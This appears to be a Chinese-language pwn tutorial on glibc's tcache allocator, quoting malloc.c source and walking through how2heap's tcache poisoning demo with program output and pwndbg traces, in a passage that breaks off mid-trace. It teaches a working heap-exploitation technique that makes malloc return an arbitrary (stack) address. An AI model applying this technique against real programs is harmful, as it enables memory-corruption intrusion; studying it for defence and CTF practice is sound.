
## tcache makes heap exploitation easy again

### 0x01 Tcache overview

在 tcache 中新增了两个结构体，分别是 tcache_entry 和 tcache_perthread_struct

```C
/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```



其中有两个重要的函数， `tcache_get()` 和 `tcache_put()`:

```C
static void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

static void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}

```

这两个函数会在函数 [_int_free](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l4173) 和 [__libc_malloc](https://sourceware.org/git/gitweb.cgi?p=glibc.git;a=blob;f=malloc/malloc.c;h=2527e2504761744df2bdb1abdc02d936ff907ad2;hb=d5c3fafc4307c9b7a4c7d5cb381fcdbfad340bcc#l3051) 的开头被调用，其中 `tcache_put` 当所请求的分配大小不大于`0x408`并且当给定大小的 tcache bin 未满时调用。一个tcache bin中的最大块数`mp_.tcache_count`是`7`。

```c
/* This is another arbitrary limit, which tunables can change.  Each
   tcache bin will hold at most this number of chunks.  */
# define TCACHE_FILL_COUNT 7
#endif
```



再复习一遍 `tcache_get()` 的源码

```C
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```
在 `tcache_get` 中，仅仅检查了 **tc_idx** ，此外，我们可以将 tcache 当作一个类似于 fastbin 的单独链表，只是它的check，并没有 fastbin 那么复杂，仅仅检查 ` tcache->entries[tc_idx] = e->next;`

### 0x02 Tcache Usage



- 内存释放：

  可以看到，在free函数的最先处理部分，首先是检查释放块是否页对齐及前后堆块的释放情况，便优先放入tcache结构中。
  

  ```c
  
  _int_free (mstate av, mchunkptr p, int have_lock)
  {
    INTERNAL_SIZE_T size;        /* its size */
    mfastbinptr *fb;             /* associated fastbin */
    mchunkptr nextchunk;         /* next contiguous chunk */
    INTERNAL_SIZE_T nextsize;    /* its size */
    int nextinuse;               /* true if nextchunk is used */
    INTERNAL_SIZE_T prevsize;    /* size of previous contiguous chunk */
    mchunkptr bck;               /* misc temp for linking */
    mchunkptr fwd;               /* misc temp for linking */
  
    size = chunksize (p);
  
    /* Little security check which won't hurt performance: the
       allocator never wrapps around at the end of the address space.
       Therefore we can exclude some size values which might appear
       here by accident or by "design" from some intruder.  */
    if (__builtin_expect ((uintptr_t) p > (uintptr_t) -size, 0)
        || __builtin_expect (misaligned_chunk (p), 0))
      malloc_printerr ("free(): invalid pointer");
    /* We know that each chunk is at least MINSIZE bytes in size or a
       multiple of MALLOC_ALIGNMENT.  */
    if (__glibc_unlikely (size < MINSIZE || !aligned_OK (size)))
      malloc_printerr ("free(): invalid size");
  
    check_inuse_chunk(av, p);
  
  #if USE_TCACHE
    {
      size_t tc_idx = csize2tidx (size);
  
      if (tcache
        && tc_idx < mp_.tcache_bins
        && tcache->counts[tc_idx] < mp_.tcache_count)
        {
          tcache_put (p, tc_idx);
          return;
        }
    }
  #endif
  
  ......
  }
  ```



-  内存申请：

在内存分配的malloc函数中有多处，会将内存块移入tcache中。

（1）首先，申请的内存块符合fastbin大小时并且在fastbin内找到可用的空闲块时，会把该fastbin链上的其他内存块放入tcache中。

（2）其次，申请的内存块符合smallbin大小时并且在smallbin内找到可用的空闲块时，会把该smallbin链上的其他内存块放入tcache中。

（3）当在unsorted bin链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到tcache中，继续处理。

代码太长就不全贴了，贴个符合fastbin 的时候

```c
  if ((unsigned long) (nb) <= (unsigned long) (get_max_fast ()))
    {
      idx = fastbin_index (nb);
      mfastbinptr *fb = &fastbin (av, idx);
      mchunkptr pp;
      victim = *fb;

      if (victim != NULL)
	{
	  if (SINGLE_THREAD_P)
	    *fb = victim->fd;
	  else
	    REMOVE_FB (fb, pp, victim);
	  if (__glibc_likely (victim != NULL))
	    {
	      size_t victim_idx = fastbin_index (chunksize (victim));
	      if (__builtin_expect (victim_idx != idx, 0))
		      malloc_printerr ("malloc(): memory corruption (fast)");
	      check_remalloced_chunk (av, victim, nb);
#if USE_TCACHE
	      /* While we're here, if we see other chunks of the same size,
		 stash them in the tcache.  */
	      size_t tc_idx = csize2tidx (nb);
	      if (tcache && tc_idx < mp_.tcache_bins)
        {
          mchunkptr tc_victim;

          /* While bin not empty and tcache not full, copy chunks.  */
          while (tcache->counts[tc_idx] < mp_.tcache_count
            && (tc_victim = *fb) != NULL)
            {
              if (SINGLE_THREAD_P)
               *fb = tc_victim->fd;
              else
              {
                REMOVE_FB (fb, pp, tc_victim);
                if (__glibc_unlikely (tc_victim == NULL))
                  break;
              }
              tcache_put (tc_victim, tc_idx);
            }
        }
#endif
	      void *p = chunk2mem (victim);
	      alloc_perturb (p, bytes);
	      return p;
	    }
	}
    }
```



 

- tcache 取出：在内存申请的开始部分，首先会判断申请大小块，在tcache是否存在，如果存在就直接从tcache中摘取，否则再使用_int_malloc分配。

- 在循环处理unsorted bin内存块时，如果达到放入unsorted bin块最大数量，会立即返回。默认是0，即不存在上限。

  ```c
  #if USE_TCACHE
        /* If we've processed as many chunks as we're allowed while
  	 filling the cache, return one of the cached ones.  */
        ++tcache_unsorted_count;
        if (return_cached
          && mp_.tcache_unsorted_limit > 0
          && tcache_unsorted_count > mp_.tcache_unsorted_limit)
        {
          return tcache_get (tc_idx);
        }
  #endif
  ```

- 在循环处理unsorted bin内存块后，如果之前曾放入过tcache块，则会取出一个并返回。

  ```c
  #if USE_TCACHE
        /* If all the small chunks we found ended up cached, return one now.  */
        if (return_cached)
        {
          return tcache_get (tc_idx);
        }
  #endif
  ```



### 0x03 Pwn Tcache

#### tcache poisoning

通过覆盖 tcache 中的 next，不需要伪造任何 chunk 结构即可实现 malloc 到任何地址。

以 how2heap 中的 [tcache_poisoning](https://github.com/shellphish/how2heap/blob/master/glibc_2.27/tcache_poisoning.c) 为例

看一下源码

```C
glibc_2.26 [master●] bat tcache_poisoning.c
───────┬─────────────────────────────────────────────────────────────────────────────────
       │ File: tcache_poisoning.c
───────┼─────────────────────────────────────────────────────────────────────────────────
   1   │ #include <stdio.h>
   2   │ #include <stdlib.h>
   3   │ #include <stdint.h>
   4   │ 
   5   │ int main()
   6   │ {
   7   │         fprintf(stderr, "This file demonstrates a simple tcache poisoning attack
       │  by tricking malloc into\n"
   8   │                "returning a pointer to an arbitrary location (in this case, the 
       │ stack).\n"
   9   │                "The attack is very similar to fastbin corruption attack.\n\n");
  10   │ 
  11   │         size_t stack_var;
  12   │         fprintf(stderr, "The address we want malloc() to return is %p.\n", (char
       │  *)&stack_var);
  13   │ 
  14   │         fprintf(stderr, "Allocating 1 buffer.\n");
  15   │         intptr_t *a = malloc(128);
  16   │         fprintf(stderr, "malloc(128): %p\n", a);
  17   │         fprintf(stderr, "Freeing the buffer...\n");
  18   │         free(a);
  19   │ 
  20   │         fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
  21   │         fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of t
       │ he data at %p\n"
  22   │                 "to point to the location to control (%p).\n", sizeof(intptr_t),
       │  a, &stack_var);
  23   │         a[0] = (intptr_t)&stack_var;
  24   │ 
  25   │         fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
  26   │         fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
  27   │ 
  28   │         intptr_t *b = malloc(128);
  29   │         fprintf(stderr, "2st malloc(128): %p\n", b);
  30   │         fprintf(stderr, "We got the control\n");
  31   │ 
  32   │         return 0;
  33   │ }
───────┴─────────────────────────────────────────────────────────────────────────────────
```

运行结果是
```bash
glibc_2.26 [master●] ./tcache_poisoning 
This file demonstrates a simple tcache poisoning attack by tricking malloc into
returning a pointer to an arbitrary location (in this case, the stack).
The attack is very similar to fastbin corruption attack.

The address we want malloc() to return is 0x7fff0d28a0c8.
Allocating 1 buffer.
malloc(128): 0x55f666ee1260
Freeing the buffer...
Now the tcache list has [ 0x55f666ee1260 ].
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x55f666ee1260
to point to the location to control (0x7fff0d28a0c8).
1st malloc(128): 0x55f666ee1260
Now the tcache list has [ 0x7fff0d28a0c8 ].
2st malloc(128): 0x7fff0d28a0c8
We got the control
```
分析一下，程序先申请了一个大小是 128 的 chunk，然后 free。128 在 tcache 的范围内，因此 free 之后该 chunk 被放到了 tcache 中，调试如下：
```asm
pwndbg> 
0x0000555555554815	18		free(a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
......
 RDI  0x555555756260 ?— 0x0
......
 RIP  0x555555554815 (main+187) ?— call   0x555555554600
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
......
 ? 0x555555554815 <main+187>    call   free@plt <0x555555554600>
        ptr: 0x555555756260 ?— 0x0
......
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
......
 ? 18 	free(a);
......
────────────────────────────────────────[ STACK ]────────────────────────────────────────
......
pwndbg> ni
20		fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x0
 RBX  0x0
 RCX  0x7
 RDX  0x0
 RDI  0x1
 RSI  0x555555756010 ?— 0x100000000000000
 R8   0x0
 R9   0x7fffffffb78c ?— 0x1c00000000
 R10  0x911
 R11  0x7ffff7aa0ba0 (free) ?— push   rbx
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x55555555481a (main+192) ?— mov    rax, qword ptr [rip + 0x20083f]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x555555554802 <main+168>    lea    rdi, [rip + 0x2bd]
   0x555555554809 <main+175>    call   fwrite@plt <0x555555554630>
 
   0x55555555480e <main+180>    mov    rax, qword ptr [rbp - 8]
   0x555555554812 <main+184>    mov    rdi, rax
   0x555555554815 <main+187>    call   free@plt <0x555555554600>
 
 ? 0x55555555481a <main+192>    mov    rax, qword ptr [rip + 0x20083f] <0x555555755060>
   0x555555554821 <main+199>    mov    rdx, qword ptr [rbp - 8]
   0x555555554825 <main+203>    lea    rsi, [rip + 0x2b4]
   0x55555555482c <main+210>    mov    rdi, rax
   0x55555555482f <main+213>    mov    eax, 0
   0x555555554834 <main+218>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   15 	intptr_t *a = malloc(128);
   16 	fprintf(stderr, "malloc(128): %p\n", a);
   17 	fprintf(stderr, "Freeing the buffer...\n");
   18 	free(a);
   19 
 ? 20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260
pwndbg> heapbase
heapbase : 0x555555756000
pwndbg> p *(struct tcache_perthread_struct*)0x555555756010
$3 = {
  counts = "\000\000\000\000\000\000\000\001", '\000' <repeats 55 times>,
  entries = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x555555756260, 0x0 <repeats 56 times>}
}
```
可以看到，此时第 8 条 tcache 链上已经有了一个 chunk，从 `tcache_perthread_struct` 结构体中也能得到同样的结论 

然后修改 tcache 的 next
```asm
pwndbg> 
We overwrite the first 8 bytes (fd/next pointer) of the data at 0x555555756260
to point to the location to control (0x7fffffffdfa8).
23		a[0] = (intptr_t)&stack_var;
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x85
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ?— 0x0
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x777265766f206557 ('We overw')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x8500000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x555555554867 (main+269) ?— lea    rdx, [rbp - 0x18]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
 ? 0x555555554867 <main+269>    lea    rdx, [rbp - 0x18] <0x7ffff7dd48b0>
   0x55555555486b <main+273>    mov    rax, qword ptr [rbp - 8]
   0x55555555486f <main+277>    mov    qword ptr [rax], rdx
   0x555555554872 <main+280>    mov    edi, 0x80
   0x555555554877 <main+285>    call   malloc@plt <0x555555554620>
 
   0x55555555487c <main+290>    mov    rdx, rax
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   18 	free(a);
   19 
   20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
 ? 23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 ?— 0x0
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260
pwndbg> n
25		fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RBX  0x0
 RCX  0x0
 RDX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x777265766f206557 ('We overw')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x8500000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x555555554872 (main+280) ?— mov    edi, 0x80
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x555555554867 <main+269>    lea    rdx, [rbp - 0x18]
   0x55555555486b <main+273>    mov    rax, qword ptr [rbp - 8]
   0x55555555486f <main+277>    mov    qword ptr [rax], rdx
 ? 0x555555554872 <main+280>    mov    edi, 0x80
   0x555555554877 <main+285>    call   malloc@plt <0x555555554620>
 
   0x55555555487c <main+290>    mov    rdx, rax
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   20 	fprintf(stderr, "Now the tcache list has [ %p ].\n", a);
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
 ? 25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│ rdx  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x555555756260 --> 0x7fffffffdfa8 --> 0x555555554650
```
此时，第 8 条 tcache 链的 next 已经被改成栈上的地址了。接下来类似 fastbin attack，只需进行两次 `malloc(128)` 即可控制栈上的空间。

第一次 malloc
```asm
pwndbg> n
1st malloc(128): 0x555555756260
26		fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x20
 RBX  0x0
 RCX  0x0
 RDX  0x7ffff7dd48b0 (_IO_stdfile_2_lock) ?— 0x0
 RDI  0x0
 RSI  0x7fffffffb900 ?— 0x6c6c616d20747331 ('1st mall')
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x2000000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x55555555489a (main+320) ?— mov    rax, qword ptr [rip + 0x2007bf]
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x55555555487f <main+293>    mov    rax, qword ptr [rip + 0x2007da] <0x555555755060>
   0x555555554886 <main+300>    lea    rsi, [rip + 0x2eb]
   0x55555555488d <main+307>    mov    rdi, rax
   0x555555554890 <main+310>    mov    eax, 0
   0x555555554895 <main+315>    call   fprintf@plt <0x555555554610>
 
 ? 0x55555555489a <main+320>    mov    rax, qword ptr [rip + 0x2007bf] <0x555555755060>
   0x5555555548a1 <main+327>    lea    rdx, [rbp - 0x18]
   0x5555555548a5 <main+331>    lea    rsi, [rip + 0x234]
   0x5555555548ac <main+338>    mov    rdi, rax
   0x5555555548af <main+341>    mov    eax, 0
   0x5555555548b4 <main+346>    call   fprintf@plt <0x555555554610>
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   21 	fprintf(stderr, "We overwrite the first %lu bytes (fd/next pointer) of the data at %p\n"
   22 		"to point to the location to control (%p).\n", sizeof(intptr_t), a, &stack_var);
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
 ? 26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
   28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
   31 
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│      0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│      0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│      0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│      0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
06:0030│      0x7fffffffdfd0 ?— 0x0
07:0038│      0x7fffffffdfd8 —? 0x7fffffffe0a8 —? 0x7fffffffe3c6 ?— 0x346d2f656d6f682f ('/home/m4')
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffdfa8 --> 0x555555554650
```

第二次 malloc，即可 malloc 栈上的地址了
```asm
pwndbg> heapinfo
3886144
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x5555557562e0 (size : 0x20d20) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x0
(0x90)   tcache_entry[7]: 0x7fffffffdfa8 --> 0x555555554650
pwndbg> ni
0x00005555555548c3	28		intptr_t *b = malloc(128);
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
──────────────────────────────────────[ REGISTERS ]──────────────────────────────────────
 RAX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RBX  0x0
 RCX  0x555555756010 ?— 0xff00000000000000
 RDX  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
 RDI  0x555555554650 (_start) ?— xor    ebp, ebp
 RSI  0x555555756048 ?— 0x0
 R8   0x7ffff7fd14c0 ?— 0x7ffff7fd14c0
 R9   0x7fffffffb78c ?— 0x2c00000000
 R10  0x0
 R11  0x246
 R12  0x555555554650 (_start) ?— xor    ebp, ebp
 R13  0x7fffffffe0a0 ?— 0x1
 R14  0x0
 R15  0x0
 RBP  0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RSP  0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
 RIP  0x5555555548c3 (main+361) ?— mov    qword ptr [rbp - 0x10], rax
───────────────────────────────────────[ DISASM ]────────────────────────────────────────
   0x5555555548ac <main+338>    mov    rdi, rax
   0x5555555548af <main+341>    mov    eax, 0
   0x5555555548b4 <main+346>    call   fprintf@plt <0x555555554610>
 
   0x5555555548b9 <main+351>    mov    edi, 0x80
   0x5555555548be <main+356>    call   malloc@plt <0x555555554620>
 
 ? 0x5555555548c3 <main+361>    mov    qword ptr [rbp - 0x10], rax
   0x5555555548c7 <main+365>    mov    rax, qword ptr [rip + 0x200792] <0x555555755060>
   0x5555555548ce <main+372>    mov    rdx, qword ptr [rbp - 0x10]
   0x5555555548d2 <main+376>    lea    rsi, [rip + 0x2b4]
   0x5555555548d9 <main+383>    mov    rdi, rax
   0x5555555548dc <main+386>    mov    eax, 0
────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────
   23 	a[0] = (intptr_t)&stack_var;
   24 
   25 	fprintf(stderr, "1st malloc(128): %p\n", malloc(128));
   26 	fprintf(stderr, "Now the tcache list has [ %p ].\n", &stack_var);
   27 
 ? 28 	intptr_t *b = malloc(128);
   29 	fprintf(stderr, "2st malloc(128): %p\n", b);
   30 	fprintf(stderr, "We got the control\n");
   31 
   32 	return 0;
   33 }
────────────────────────────────────────[ STACK ]────────────────────────────────────────
00:0000│ rsp      0x7fffffffdfa0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
01:0008│ rax rdx  0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
02:0010│          0x7fffffffdfb0 —? 0x7fffffffe0a0 ?— 0x1
03:0018│          0x7fffffffdfb8 —? 0x555555756260 —? 0x7fffffffdfa8 —? 0x555555554650 (_start) ?— xor    ebp, ebp
04:0020│ rbp      0x7fffffffdfc0 —? 0x555555554910 (__libc_csu_init) ?— push   r15
05:0028│          0x7fffffffdfc8 —? 0x7ffff7a3fa87 (__libc_start_main+231) ?— mov    edi, eax
